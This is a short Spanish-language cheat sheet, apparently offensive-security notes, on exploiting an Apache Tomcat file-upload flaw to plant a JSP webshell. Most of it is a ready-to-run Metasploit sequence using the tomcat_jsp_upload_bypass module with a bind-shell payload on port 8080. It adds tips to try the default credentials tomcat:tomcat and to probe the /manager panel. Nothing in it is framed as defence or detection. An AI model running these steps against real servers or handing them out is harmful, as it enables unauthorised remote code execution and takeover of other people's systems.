
Vulnerabilidad en Apache Tomcat que permite subir una webshell JSP.

• Afecta servidores Tomcat  
• Permite subida de archivos  
• Puede llevar a RCE

---

## Exploit Tomcat

Sube una shell JSP al servidor.

```
use exploit/multi/http/tomcat_jsp_upload_bypass
```

	set RHOSTS IP  
	set RPORT 8080  
	set TARGETURI /  
	set PAYLOAD java/jsp_shell_bind_tcp  
	set SHELL cmd


## Tip importante

• Tomcat suele correr en puerto 8080  
• Buscar credenciales por defecto (tomcat:tomcat)  
• Revisar panel /manager  
• Puede requerir autenticación

